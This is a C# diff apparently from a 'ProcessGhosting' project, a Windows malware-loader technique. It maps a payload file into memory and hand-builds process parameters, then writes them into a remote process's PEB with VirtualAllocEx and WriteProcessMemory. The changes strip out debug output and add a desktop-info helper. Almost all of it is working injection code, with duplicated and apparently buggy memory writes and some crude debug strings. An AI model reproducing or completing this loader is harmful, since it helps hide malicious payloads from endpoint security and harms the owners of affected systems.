@@ -93,7 +93,6 @@ namespace ProcessGhosting
         public static IntPtr BufferPayload(string filename, ref long size)
         {
             IntPtr fileHandle = CreateFileW(filename, FileAccess.Read, FileShare.Read, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
-            Console.WriteLine(fileHandle);
 
             IntPtr mapping = CreateFileMapping(fileHandle, IntPtr.Zero, FileMapProtection.PageReadonly, (uint)0, (uint)0, String.Empty);
 
@@ -106,13 +105,10 @@ namespace ProcessGhosting
             Console.WriteLine("File Size : "+size);
 
             IntPtr localCopyAddress = VirtualAlloc(IntPtr.Zero, (uint)size, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
-            Console.WriteLine(localCopyAddress);
             //byte[] temp = BitConverter.GetBytes((UInt32)rawDataPointer);
 
             memcpy(localCopyAddress, rawDataPointer, (UIntPtr)size);
-            Console.WriteLine("BitConverter.GetBytes");
             //Marshal.Copy(temp, 0, localCopyAddress, (int)size);
-            Console.WriteLine("End of BufferPayload function");
 
             return localCopyAddress;
         }
@@ -164,7 +160,7 @@ namespace ProcessGhosting
 
             uint BytesRead = 0;
             bool bRPM = ReadProcessMemory(hProc, (IntPtr)(pMem), pMemLoc, (uint)Size, ref BytesRead);
-            Console.WriteLine("Read Memory Error : 0x{0:X}", pMemLoc);
+            //Console.WriteLine("Read Memory Error : 0x{0:X}", pMemLoc);
             if (bRPM != true)
             {
                 if (BytesRead != Size)
@@ -209,100 +205,27 @@ namespace ProcessGhosting
             }
             return true;
         }
-        /*
-        unsafe public static void SetupProcessParameters(ref IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
+
+        public static void GetDesktopInfo(PROCESS_BASIC_INFORMATION bi, IntPtr hProcess)
         {
-            IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
-            IntPtr uDllDir = CreateUnicodeStruct("C:\\Windows\\System32");
-            IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\User\\Desktop");
-            IntPtr uWindowName = CreateUnicodeStruct("Babachoda");
-            IntPtr uCommandLine = CreateUnicodeStruct("Somerandomparam");
+            IntPtr thispeb = bi.PebAddress;
+            IntPtr thisprocparam = ReadRemoteMem(hProcess, thispeb.ToInt64() + 0x20, 0x8);
+            IntPtr deskInfoPtr = (IntPtr)(thisprocparam.ToInt64() + 0xc0);
 
-            IntPtr pProcessParameters = IntPtr.Zero;
+            //Read Desktopinfo 
 
-            RTL_USER_PROCESS_PARAMETERS param = new RTL_USER_PROCESS_PARAMETERS();
-            IntPtr environment = Marshal.AllocHGlobal(Marshal.SizeOf(param));
-            bool res = CreateEnvironmentBlock(out environment, IntPtr.Zero, true);
-
-            Console.WriteLine("Create Environment Block Error : " + GetLastError());
-            Console.WriteLine("CreateEnvironment Block result : " + res);
-            Console.WriteLine("Environment : 0x{0:X}", environment);
-            SetLastError(0);
-
-            BASIC_INFORMATION pbi = new BASIC_INFORMATION();
-            uint temp = 0;
-            NtQueryInformationProcess(hProcess, 0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
-            Console.WriteLine("Query Process Information Error : " + GetLastError());
-            int RtlStatus = RtlCreateProcessParametersEx(ref pProcessParameters, uTargetPath, uDllDir, uCurrentDir, uTargetPath, environment, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
-            Console.WriteLine("RtlStatus 0x{0:X}", RtlStatus);
-            
-            Int64 pParameters = pProcessParameters.ToInt64() + 4;
-            IntPtr pParameterPointer = new IntPtr(pParameters);
-            Int32 ProcParamsLength = Marshal.ReadInt32(pParameterPointer);
-
-            //IntPtr allocatedBaseAddress = VirtualAllocEx(hProcess, pProcessParameters, Convert.ToUInt32(ProcParamsLength), (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
-            IntPtr allocatedBaseAddress = VirtualAllocEx(hProcess, pProcessParameters, Convert.ToUInt32(ProcParamsLength), (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ExecuteReadWrite);
-            Console.WriteLine(GetLastError());
-            Console.WriteLine("VirtualAlloc status : 0x{0:X}", allocatedBaseAddress);
-            Console.WriteLine("ProcParamsLength 0x{0:X}", ProcParamsLength);
-            Console.WriteLine("ProcessParameters : 0x{0:X}", pProcessParameters);
-
-            uint bytesWritten = 0;
-            bool WriteStatus = WriteProcessMemory(hProcess, pProcessParameters, pProcessParameters, Convert.ToUInt32(ProcParamsLength), ref bytesWritten);
-            Console.WriteLine("pProcessParameters : 0x{0:X}", pProcessParameters);
-
-            Console.WriteLine("WriteProcessMemory status : "+WriteStatus);
-            Console.WriteLine(bytesWritten);
-
-            //Writing to peb
-            PEB peb = new PEB();
-            IntPtr procParams = peb.ProcessParameters;
-
-            //Console.WriteLine("Process Parameters : 0x{0:X}", pbi.PebAddress.ProcessParameters);
-            //ReadProcessMemory(hProcess, procParams, )
-            //WriteStatus = WriteProcessMemory(hProcess, allocatedBaseAddress, pProcessParameters, Convert.ToUInt32(ProcParamsLength), ref bytesWritten); //Debug this part
-            
-            WriteStatus = WriteProcessMemory(hProcess, peb.ProcessParameters, pbi.PebAddress.ProcessParameters, Convert.ToUInt32(Marshal.SizeOf(pbi.PebAddress.ProcessParameters)), ref bytesWritten);
-            uint error = GetLastError();
-            Console.WriteLine("Last error : " + error);
-            Console.WriteLine("WriteStatus : "+WriteStatus);
-            Console.WriteLine("Bytes Written : 0x{0:X}", bytesWritten);
-           
-
-            PEB theirpeb = new PEB();
-            IntPtr pebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
-            IntPtr lpBaseAddress = bi.PebAddress;
-            byte[] pebarray = new byte[Marshal.SizeOf(theirpeb)];
-            uint fuck = 0;
-
-            bool r = ReadProcessMemory(hProcess, lpBaseAddress, pebptr, Marshal.SizeOf(theirpeb), out _);
-            //bool r = ReadProcessMemory(hProcess, lpBaseAddress, pebarray, Marshal.SizeOf(pebarray), out _);
-            //Marshal.Copy(pebarray, 0, pebptr, pebarray.Length);
-
-            Console.WriteLine("The peb pointer : 0x{0:X}", pebptr);
-            Console.WriteLine("Read Process Error : " + GetLastError());
-            Console.WriteLine("Read Process Memory Result : " + r);
-            theirpeb.ProcessParameters = pProcessParameters;
-            pebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
-            WriteStatus = WriteProcessMemory(hProcess, lpBaseAddress, pebptr, (uint)Marshal.SizeOf(theirpeb), ref fuck);
-            Console.WriteLine(GetLastError());
-            Console.WriteLine("Write Status for PEB : " + WriteStatus);
-
-            return;
+            Int64 test = Marshal.ReadInt64(deskInfoPtr + 0x636);
+            Console.WriteLine("Desktopinfo value : 0x{0:X}" , test);
         }
-    */
-
-        unsafe public static void SetupProcessParameters(ref IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
+ 
+        unsafe public static IntPtr SetupProcessParameters(IntPtr hProcess, PROCESS_BASIC_INFORMATION bi, string targetPath)
         {
-            Int32 RtlUserProcessParam = 0x20;
-            Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", (bi.PebAddress).ToInt64()));
+            IntPtr temp = bi.PebAddress;
+            Console.WriteLine("[+] PEB Base                      : 0x" + string.Format("{0:X}", temp.ToInt64()));
+    
             Int32 CommandLine = 0x70;
             Int32 ReadSize = 0x8;
-            Thread.Sleep(500);
             SetLastError(0);
-            RTL_USER_PROCESS_PARAMETERS rpp = new RTL_USER_PROCESS_PARAMETERS();
-            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
-            PEB theirpeb =new  PEB();
             UInt64 ProcParams;
 
             //RTL_USER_PROCESS_PARAMETERS unicode string params
@@ -310,51 +233,69 @@ namespace ProcessGhosting
             String WinDir = Environment.GetEnvironmentVariable("windir");
             IntPtr uSystemDir = CreateUnicodeStruct(WinDir + "\\System32");
             IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
-            IntPtr uWindowName = CreateUnicodeStruct("Babachoda");
+            IntPtr uWindowName = CreateUnicodeStruct("test");
             IntPtr uCurrentDir = CreateUnicodeStruct("C:\\Users\\User\\Desktop");
+            IntPtr desktopInfo = CreateUnicodeStruct(@"WinSta0\Default");
 
-            //Create local RTL_USER_PROCESS_PARAMETERS
-            PEB environment = new PEB();
-            IntPtr envptr = Marshal.AllocHGlobal(Marshal.SizeOf(environment));
-            CreateEnvironmentBlock(out envptr, IntPtr.Zero, true);
-            IntPtr pProcessParams = IntPtr.Zero;
+            IntPtr environment = IntPtr.Zero;
+            CreateEnvironmentBlock(out environment, IntPtr.Zero, true);
+            //PEB = TEB + 0x1000
+            IntPtr pProcParams = IntPtr.Zero;
+            GetDesktopInfo(bi, hProcess);
+            UInt32 status = RtlCreateProcessParametersEx(ref pProcParams, uTargetPath, uSystemDir, uSystemDir, uTargetPath, environment, uWindowName, desktopInfo, IntPtr.Zero, IntPtr.Zero, 1);
 
-           // uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uTargetPath, uSystemDir, uCurrentDir, uTargetPath, IntPtr.Zero, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
-            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uTargetPath, uSystemDir, uCurrentDir, uTargetPath, envptr, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
-            if (RtlCreateSuccess != 0)
+            //Writing params into process
+            Int32 EnvSize = Marshal.ReadInt32((IntPtr)pProcParams.ToInt64() + 0x3f0);
+            IntPtr EnvPtr = (IntPtr)Marshal.ReadInt64((IntPtr)(pProcParams.ToInt64() + 0x080));
+
+            bool writememstat = false;
+            Int32 Length = Marshal.ReadInt32((IntPtr)pProcParams.ToInt64() + 4);
+
+            IntPtr buffer = pProcParams;
+            Int64 buffer_end = pProcParams.ToInt64() + Length;
+            if (pProcParams.ToInt64() > EnvPtr.ToInt64())
             {
-                Console.WriteLine("BHENCHOD");
-                Environment.Exit(1);
+                buffer = EnvPtr;
+            }
+            IntPtr env_end = (IntPtr)(EnvPtr.ToInt64() + EnvSize);
+            if (env_end.ToInt64() > buffer_end)
+            {
+                buffer_end = env_end.ToInt64();
             }
 
-            RTL_USER_PROCESS_PARAMETERS processParamStruct = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(pProcessParams, typeof(RTL_USER_PROCESS_PARAMETERS));
+            uint buffer_size = (uint)(buffer_end - buffer.ToInt64());
+            //VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
+            VirtualAllocEx(hProcess, buffer, buffer_size, (int)(AllocationType.Commit | AllocationType.Reserve), (int)(MemoryProtection.ReadWrite));
+            SetLastError(0);
+            writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
+            Console.WriteLine("pProcparam : 0x{0:X}", pProcParams.ToInt64());
+            Console.WriteLine("Env Size : 0x{0:X}", EnvSize);
+            Console.WriteLine("Env Pointer: 0x{0:X}", EnvPtr.ToInt64());
+            writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
+            SetLastError(0);
+            //Writing params in blocks
 
-            Console.WriteLine("[+] RtlCreateProcessParametersEx  : 0x" + string.Format("{0:X}", (UInt64)pProcessParams));
+            VirtualAllocEx(hProcess, pProcParams, (uint)Length, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
+            Console.WriteLine("Check Error : " + GetLastError());
+            writememstat = WriteRemoteMem(hProcess, pProcParams, pProcParams, Length, MemoryProtection.ReadWrite);
+            Console.WriteLine("Write Mem stat : " + writememstat);
+            SetLastError(0);
+            
+            SetLastError(0);
+            //uint byteswritten = 0;
+            VirtualAllocEx(hProcess, EnvPtr, (uint)EnvSize, (int)(AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ReadWrite);
+            Console.WriteLine("Check error 2 : " + GetLastError());
+            writememstat = WriteRemoteMem(hProcess, EnvPtr, EnvPtr, EnvSize, MemoryProtection.ReadWrite);
+            Console.WriteLine("Write mem stat 2 : " + writememstat);
 
-            IntPtr lpParams = pProcessParams;
-            Int32 length = Marshal.SizeOf(rpp);
-            IntPtr remoteBuffer = AllocRemoteMem(hProcess, length, lpParams);
-            Console.WriteLine(GetLastError());
-            Console.WriteLine("Remote Buffer : 0x{0:X}", remoteBuffer.ToInt64());
+            //Set params in peb
+            IntPtr myProcParams = Marshal.AllocHGlobal(ReadSize);
+            Marshal.WriteInt64(myProcParams, (Int64)pProcParams);
+            Console.WriteLine("Writing Process Parameters to peb : 0x{0:X}", temp.ToInt64());
 
-            bool WriteMemoryStat = WriteRemoteMem(hProcess, pProcessParams, pProcessParams, length, MemoryProtection.ExecuteReadWrite);
-            Console.WriteLine("Write Memory stat : " + WriteMemoryStat);
+            writememstat = WriteRemoteMem(hProcess, myProcParams, (IntPtr)(temp.ToInt64() + 0x20), ReadSize, MemoryProtection.ReadWrite);
 
-            IntPtr lpBaseAddress = bi.PebAddress;
-            uint byteread = 0;
-            IntPtr theirpebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
-            bool r = ReadProcessMemory(hProcess, lpBaseAddress, theirpebptr, (uint)Marshal.SizeOf(theirpeb), ref byteread);
-
-            Console.WriteLine("Read Memory : " + r);
-            Console.WriteLine(GetLastError());
-
-            theirpeb = (PEB)Marshal.PtrToStructure(theirpebptr, typeof(PEB));
-            theirpeb.ProcessParameters = bi.PebAddress + RtlUserProcessParam;
-            theirpebptr = Marshal.AllocHGlobal(Marshal.SizeOf(theirpeb));
-            WriteMemoryStat = WriteProcessMemory(hProcess, lpBaseAddress, theirpebptr, (uint)Marshal.SizeOf(theirpeb), ref byteread);
-            Console.WriteLine("Writing to peb stat : " + WriteMemoryStat);
-
-            return;
+            return hProcess;
         }
     }
 }
